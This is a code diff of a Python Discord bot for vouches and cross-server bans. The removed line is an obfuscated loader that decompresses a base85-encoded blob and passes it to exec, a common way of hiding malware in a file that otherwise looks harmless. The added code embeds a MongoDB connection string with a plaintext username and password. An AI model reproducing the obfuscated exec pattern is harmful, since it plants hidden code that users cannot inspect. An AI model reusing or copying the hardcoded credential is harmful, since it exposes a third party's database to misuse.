@@ -1,1 +1,254 @@
-import zlib,base64;exec(zlib.decompress(base64.b85decode('c%1E8OOxBU5x(nJz&u3cSmxMHe8`mL`0cpX_Ey%9R5EtS5D7}~Qh<s8HKR<;HRl}jC-SHEm!umH5~Qfn#P+5tRhfflNHqH0UpGMW)mm1X<XmO4%11>dSN<Vo=bCW4p2^jUid<QO^>!u2Li)wm`0%9UOz6&fs#vvQ)r_vWCw*()JX&)niE5_#iuq;#JR$gR&Pq*3Zt07X!v9UxR%Bd`Mn=r6t~i;J$UNlpo2uHJ93OA$4L>QeS1+I6lXU*uKRx~H5A=5rv$9s2Rkzaxqs8C0+th7J1=GiWsF<#{f3CP@YO1T6{pM`CqF*Gu*hWrPX3PX}fzffJ#)PycPa9j~@ttv!jPf~b3%P(2dIl!bIaMr<eq1y0Vm{x<I$JUoC8JE1CCfCIVkRg!32gL>!5X{<{gGAsF79njMvFNWvr;b9Y=CRC7!A@5O4!RV8I8`kUJ?oB#N$kgf-h2x-grXB)i{CZ5&L#l@RFU32>jR=AP5Q5QqnvQXn^IqVg)}30>==viO2RO^1U@qMjy~OujFEuEvXQ!obkLzKR^NdwEUTg9;JB)YqTuo8OwoC^(c(}!7>n!MsukRnJt#|vDC49m|0z?_Sb}Pp&<j*)YsZe`<w#D7;<G)Ql)1m+Q9JQ5_mrZ<|*4?k(vA_IV%YGyka!p#)<VKJ)>L`q(l=J48<xYG8QXMb=}H)YaY{F<P$<6cpJ#^X7Q1G5$o-m?Yw;lFVi!svn3ac3Bj08o5V!j_i4IfO3?+2-EXHdFNk}Q(poQNMW$0@K@GKJN$>}1v#tag`8`~50XCs&e!Gk6qyey}ub<dgNy~?=<_z<~(>%lHxLL*@&2<STy|!$LL8=b`C()!smNS)Ae2s}ejsD0W6>gAsORhjQLcLAxZl&v-O9DBO_836{$!dE0{I>Zaq*+Y5TBkJ6p&nS7$JXgDMIoaJ+0e2^eQD0fd`l4dQt}sBlZ*;daFGM*RDiKSO-`4rVxQur)@ubQ>AkR69KY9_->-hio{76qqJ9s=L76AIUaS7*O=DHM+A44WKTo+lPNG(Cn~%K!L0=H2zA@#e(b3W8&!3Nuzz}2Q)cl)_dilJrWCm<zzPOq!x@KjpD=4|Rh@kuzkN{jD4qf;>OVOd1k!R+F#7V%=WO$ruC|=wF*(@;hCru{3hqn__Q4M8rf(1SyNAS$3LMo*zrwQ&xl+fqtqUL38kadMtS8>QW<=zXB?nrIRBSl!7k{;zr&*eyO+#I<?5CBaUPYNipt*k4ESaBnWm94NwVv9fq@Hz_E42gZaPK7*+6LKrqbK0T*l#u&vOOKZ*eR?N3s5C^e+&Z--lsZ|1>u~ozy$z}9sR)}5Nn|wvoQ_Vqu52qYG9EP)J>Ld2Ho8D!{|Hx1oN>kcVHPf3Z}a^z1;}ERo=L&tR#O+`y}m=R>Nq+y)m6dFB~=S#h4Ep<GR8NM@6-n$;pid|0NJ}P>DILFODv0vHZje+8y`g!a6LMDWKsI%)03m44lABt_Gy2z)qsT7W0%MGc4%yc7#j2ErCqlXHfZ3@>w>n!X|(gF)=typZvdKv_`K_^Ne^}hz3Kp~=h#O<AzgHG#r?h{O8}QSgRw$sfYBUb`M>9M1R_t_OXXiJK&__+V`PFt-Wq50LW2@62Hk#Xn!-+)Y_+sg9I@kqnNRJTcwo>=8eD5%_wgrKvN#kpB){N{E){Ec+unk$g?OD1ZVOq99FZz$Wevm)vOds#m<sw2U_Le(u>K9;NjprrMVvx#q1DnaOuGme=6wbl+X=RTEc0rX%dEyMQt?F}Cn2evg~Owj%K(#<AFLIa@%D6dLLzdLbd!HiW%8n<<O6cMHO+aat2s_Sd(`#&wA8em*~Ev<s$N-KKJ`HV$rQOQcTn2N3FaHH0W-E?(cyR;YCP%&0%q3=6^^3xi{v6cjehypKO!^PLa(eab>c4f#AF?be);F$Bcm2al`0(b<9o@cq!lncEjn0e2FAipUKidiehTBF<bq9~Q;>FO0=0Gh1nt}58`%C;ydPQXiG`?PwT%}ocM@N8{dJPwEdb4u17ZU#f^azQD_Z@W%QNv&yjwCmv6(|H7G2{ogYr#>?bz!x1#sM&K7bnEMLgn6+vLS|SMUMwK|mc{0X%rl-9?=iZn}dhs)M6-doI3u#>=G`YcOPEM!OYP3jLrZ3L_d1Q%<LJ&%mdvZ5QFdiS41GU~oz`?LKzeJNQ1&*t)s(O5aHR91Cv0uBLVxOy8#r7Nx;4^nvL~_z<|Dqirk4Vjnu%YxLv%3!qrc^QqU{pCqQyi&D;MNgh)XsL`|Nxvb_q&zTq!*O*mAuhHXxRIT$BdLLA=d6u>lN-&+IzNh(1pzg4}k~!3&J~VI7vFX{-u7l433C_Gw;;S{RHZyRoGcyLKTuJcwit0ES8pK0K1>?BU`M~8?v@ly|K&qURd)vZM-h1KNZO|$PC!5E{1p`CQepGzzo!bG#`wx3F;R7iBtJqk{1l8#?^7vv|^rx-eTQzTf_g1a9ZD2?%zkNRQcL=EY+d9Jwf}%#pF1&|rl7-2f?p`$*H~nW5-PM>`i~pnMwNcaIfW=Bs<n}jVsrxpNs*<sFd^ZWM(^?{nWj0FoFxUgv_qY`3yQ}BTDY^42p|8>F5dQW=d$ZpGLdse{t14L?cF#R@Pk78WlCK3_#zP0d%kuk95VnVz*W(&cc5PPXlH`Sn^Um1W$pSam9%gNi(CuBV;T7hZXY@Y-xBiYn4MJ}1+_(d@);C`Xw|l`>ZOp0IVXKYHtmF#MvC&82j#ot#77)4R>j{!0+J`lX2O=0TG^nrfgDB4E7(0tbAH_u=5z`?Wnzy?=t~%%ACB1DN{=*R}Y_5;HC;cdj-Y(^tGCPnvwg5VZ+9#B#HOqLxGtY#8ff`N{#x1gFzfb`ecPEV}t<Dq&e#If`jU;PYfexBgD*SR0*)E4P_g$SmII+o$-#<)OF@*$4;lg5cz;9&ukwkQv?Xr6ORgBE}r^AWd5ANjg$<!hU@V5~dekTXwkF4!i++Ds*^>nl$z%Bj?qB)Gsw~lFt4Mq!joQC23<QaWiEZvZ6eg(%$H5gYbkTz@%N2m$+x5oGz1N*gM`|4PI@7VC7TilIA&m{nF2N5BC+xuHa-By3q38XMz4ei}^$n|nhBk%AWxKje$7`U3juYKmLQ6OPL#&4uUnsp^NJZI3kIxX~SVNctf-Vqt*`yR>RP0IoKS6!DhI(9nPz^>?t3+K)R+}-Lmbv^48T9qH)O<>HGPtT$06%Mui%;%EpXg(7^b+4cH&3dm~0y`5_@6O&j9j|W3AH~>q*wBmwRw94rw=b)%zLP?wt6Ie7e_|w~e*<DC(y#')).decode())
+import discord
+from discord.ext import commands        
+from pymongo import MongoClient
+from pymongo.server_api import ServerApi
+from datetime import datetime, timedelta
+import json
+import asyncio
+
+mongo_uri = "mongodb+srv://vuvi:fcLIF5oab3QDZKa4@cluster0.geafzyy.mongodb.net/?retryWrites=true&w=majority"
+mongo_client = MongoClient(mongo_uri, server_api=ServerApi('1'))
+db = mongo_client.get_database("OpenGbbvouches")
+collection_name = "vouches"
+collection = db.get_collection(collection_name)
+gban_logs_collection_name = "gban_logs"
+gban_logs_collection = db.get_collection(gban_logs_collection_name)
+
+with open('config.json', 'r') as config_file:
+    config = json.load(config_file)
+
+prefix = config.get('prefix', '-')
+VouchLog_channel_id = config.get('VouchLog_channel_id')
+token = config.get('token')
+allowed_ids = config.get('gban_allowed_ids')
+
+
+bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all())
+
+last_vouch = {}
+
+
+@bot.event
+async def on_ready():
+    await bot.change_presence(status=discord.Status.dnd, activity=discord.Activity(type=discord.ActivityType.watching, name="vouches"))
+
+@bot.event
+async def on_message(message):
+    if message.author == bot.user:
+        return
+
+    if isinstance(message.channel, discord.DMChannel):
+        embed = discord.Embed(
+            title="Message from Vuvi",
+            description="Hello! This is a message from Vuvistudio Bot.",
+            color=0x000000
+        )
+        embed.add_field(name="Info", value="Made by vuvi. You can find more info [here](https://discord.gg/Utv9mKcEn2) and more bots and apps [here](https://vuvistudio.mysellix.io/)")
+        await message.channel.send(content="**```**", embed=embed)
+
+    await bot.process_commands(message)
+
+@bot.event
+async def on_ready():
+    print(f"Logged in as {bot.user.name}")
+
+@bot.command()
+async def vouch(ctx, user_mention: discord.User, rating: int, *, reason: str):
+    user = ctx.guild.get_member(user_mention.id)
+
+    if ctx.author.id == user_mention.id:
+        await ctx.send("You cannot vouch for yourself!")
+        return
+
+    if last_vouch.get(ctx.author.id) and (datetime.now() - last_vouch[ctx.author.id]) < timedelta(hours=1):
+        await ctx.send("You can only vouch once per hour!")
+        return
+
+    vouch_data = {
+        "author_id": ctx.author.id,
+        "user_id": user_mention.id,
+        "rating": rating,
+        "reason": reason
+    }
+    collection.insert_one(vouch_data)
+
+    last_vouch[ctx.author.id] = datetime.now()
+
+    vouch_message_user = (
+        f"You received a vouch from {ctx.author.display_name} in {ctx.guild.name}!\n"
+        f"**Author ID:** {ctx.author.id}\n"
+        f"**Rating:** {rating}/5\n"
+        f"**Reason:** {reason}"
+    )
+    embed_user = discord.Embed(title="You Received a Vouch!", description=vouch_message_user, color=0x000000)
+
+    vouch_message_channel = (
+        f"A vouch for {user_mention.mention} has been stored by {ctx.author.display_name} in {ctx.guild.name}!\n"
+        f"**Author ID:** {ctx.author.id}\n"
+        f"**User ID:** {user_mention.id}\n"
+        f"**Rating:** {rating}/5\n"
+        f"**Reason:** {reason}"
+    )
+    embed_channel = discord.Embed(title="Vouch Stored", description=f"**{vouch_message_channel}**", color=0x000000)
+
+
+    log_channel = bot.get_channel(VouchLog_channel_id)
+    if log_channel:
+        await log_channel.send(embed=embed_channel)
+    else:
+        print("Log channel not found!")
+
+    await ctx.send(embed=embed_channel)
+
+@bot.command()
+async def vouches(ctx, user_id: int = None):
+    if user_id is None:
+        user_id = ctx.author.id
+
+    vouch_count = collection.count_documents({"user_id": user_id})
+
+    embed = discord.Embed(title="User Vouches in Server: " + ctx.guild.name, color=0x000000)
+
+    if vouch_count > 0:
+        vouches = collection.find({"user_id": user_id})
+        total_rating = sum(vouch["rating"] for vouch in vouches)
+        average_rating = total_rating / vouch_count
+
+        user_stars = "".join(["⭐" if i < round(average_rating) else "☆" for i in range(5)])
+
+        embed.add_field(name="User ID", value=f"**```{user_id}```**", inline=False)
+        embed.add_field(name="Vouch Count", value=f"**```{vouch_count}```**", inline=False)
+        embed.add_field(name="Average Rating", value=f"**```{user_stars}```** ({average_rating:.2f}/5)", inline=False)
+        embed.description = f"**```markdown\nThe user with id: {user_id} has received {vouch_count} vouches!\n```**"
+    else:
+        embed.description = f"**```markdown\nThe user with id: {user_id} has not received any vouches!\n```**"
+
+    await ctx.send(embed=embed)
+
+
+
+
+
+@bot.command()
+async def gban(ctx, user_id: int):
+    if ctx.author.id not in allowed_ids:
+        await ctx.send("You don't have permission to use this command.")
+        return
+
+    try:
+        user = await bot.fetch_user(user_id)
+    except discord.NotFound:
+        await ctx.send("User not found.")
+        return
+
+    for guild in bot.guilds:
+        try:
+            await guild.ban(discord.Object(id=user_id), reason="Global Ban")
+        except discord.Forbidden:
+            await ctx.send(f"Missing permissions to ban {user.name} in {guild.name}.")
+
+    gban_log = {
+        "moderator_id": ctx.author.id,
+        "banned_user_id": user_id,
+        "timestamp": datetime.utcnow().isoformat(),
+        "reason": "Global Ban"
+    }
+    gban_collection = db.get_collection("global_bans")
+    gban_collection.insert_one(gban_log)
+
+    embed = discord.Embed(title="User Globally Banned", color=0x000000)
+    embed.add_field(name="Moderator", value=f"**<@{ctx.author.id}>**")
+    embed.add_field(name="Banned User", value=f"**<@{user_id}>**")
+
+    log_channel_id = config.get('gban_log_channel_id')
+    log_channel = bot.get_channel(log_channel_id)
+    if log_channel:
+        await log_channel.send(content=f"**Successfully globally banned {user.name}.**", embed=embed)
+    else:
+        print("Log channel not found!")
+
+
+
+
+
+@bot.command()
+async def gunban(ctx, user_id: int):
+    if ctx.author.id not in allowed_ids:
+        await ctx.send("You don't have permission to use this command.")
+        return
+
+    try:
+        user = await bot.fetch_user(user_id)
+    except discord.NotFound:
+        await ctx.send("User not found.")
+        return
+
+    banned_guilds = 0
+    for guild in bot.guilds:
+        try:
+            await asyncio.sleep(2)
+            await guild.unban(user, reason="Global Unban")
+            banned_guilds += 1
+        except discord.Forbidden:
+            await ctx.send(f"Missing permissions to unban {user.name} in {guild.name}.")
+        except asyncio.TimeoutError:
+            await asyncio.sleep(5)
+
+    embed_unban = discord.Embed(title="User Globally Unbanned", color=0x000000)
+    embed_unban.add_field(name="Moderator", value=f"**<@{ctx.author.id}>**")
+    embed_unban.add_field(name="Unbanned User", value=f"**<@{user_id}>**")
+    embed_unban.add_field(name="Unbanned from Guilds", value=f"**```{banned_guilds}```**")
+    embed_unban.add_field(name="Reason", value="**```Global Unban```**")
+
+    log_channel_id = config.get('gban_log_channel_id')
+    log_channel = bot.get_channel(log_channel_id)
+    if log_channel:
+        await log_channel.send(content="**User successfully globally unbanned.**", embed=embed_unban)
+    else:
+        print("Log channel not found!")
+
+
+
+@bot.command()
+async def svs(ctx):
+    guilds_list = "\n".join(f"{guild.name} - {guild.id}" for guild in bot.guilds)
+    formatted_text = f"```Guilds:\n{guilds_list}```"
+    await ctx.send(formatted_text)
+
+@bot.command()
+async def info(ctx, command_name: str = None):
+    """Shows information about a specific command or the list of commands."""
+    usage = {
+        "svs": "No parameters.",
+        "gunban": "<user_id>: Unbans a user from all guilds the bot is in.",
+        "gban": "<user_id>: Bans a user from all guilds the bot is in.",
+        "vouch": "<user_id> <rating: int> <reason>: Vouches for a user in the server.",
+        "vouches": "<user_id>: Shows the vouches received by a user.",
+        "info": "[command_name]: Shows information about a specific command or the list of commands."
+    }
+
+    descriptions = {
+        "svs": "Shows a list of guilds the bot is in.",
+        "gunban": "Unbans a user from all guilds the bot is in.",
+        "gban": "Bans a user from all guilds the bot is in.",
+        "vouch": "Vouches for a user in the server.",
+        "vouches": "Shows the vouches received by a user.",
+        "info": "Shows information about a specific command or the list of commands."
+    }
+
+    if command_name:
+        command = bot.get_command(command_name)
+        if command:
+            embed = discord.Embed(title=f"Info for {command_name}", color=0x000000)
+            embed.add_field(name="Usage", value=f"**```{usage.get(command_name, 'No usage provided')}```**")
+            embed.add_field(name="Description", value=f"**```{descriptions.get(command_name, 'No description provided')}```**")
+            await ctx.send(embed=embed)
+        else:
+            await ctx.send("Command not found.")
+    else:
+        command_list = [f"{command.name}: {usage.get(command.name, 'No usage provided')}" for command in bot.commands]
+        embed = discord.Embed(title="List of Commands", description="**```" + '\n'.join(command_list) + "```**", color=0x000000)
+        await ctx.send(embed=embed)
+
+
+bot.run(token)
